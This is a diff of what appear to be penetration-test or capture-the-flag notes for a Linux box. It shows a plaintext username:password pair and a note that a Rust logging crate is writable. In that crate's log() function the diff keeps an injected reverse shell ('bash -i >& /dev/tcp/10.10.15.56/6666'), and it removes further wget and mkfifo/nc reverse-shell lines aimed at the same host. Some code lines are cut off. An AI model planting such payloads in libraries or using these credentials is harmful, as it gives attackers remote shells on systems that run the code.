@@ -132,12 +132,6 @@ silentobserver:quietLiketheWind22
 
 /opt/crates/logger/src/lib.rs is writable
 
-use std::process::Command;
-
-Command::new("wget").arg("http://10.10.15.56:8000/").output().expect('nothing');
-
-Command::new("rm").arg("-f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.56 6666 >/tmp/f").output().expect('nothing');
-
 
 extern crate chrono;
 
@@ -147,18 +141,17 @@ use chrono::prelude::*;
 use std::process::Command;
 
 pub fn log(user: &str, query: &str, justification: &str) {
-
     Command::new("bash")
-.arg("-c")
-.arg("bash -i >& /dev/tcp/10.10.15.56/6666 0>&1")
-.output()
-.expect(“failed to execute process”);
-    
+        .arg("-c")  
+        .arg("bash -i >& /dev/tcp/10.10.15.56/6666 0>&1")
+        .output()
+        .expect("failed to execute process");
+
     let now = Local::now();
     let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
-    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
+    let log_message = format!("[{}] - User: {}, Query: {}, Justificatio>
 
-    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
+    let mut file = match OpenOptions::new().append(true).create(true).o>
         Ok(file) => file,
         Err(e) => {
             println!("Error opening log file: {}", e);
@@ -170,12 +163,4 @@ pub fn log(user: &str, query: &str, justification: &str) {
         println!("Error writing to log file: {}", e);
     }
 }
-
-use std::process::Command;
-
-Command::new("bash")
-.arg("-c")
-.arg("bash -i >& /dev/tcp/10.10.15.56/6666 0>&1")
-.output()
-.expect(“failed to execute process”)
 
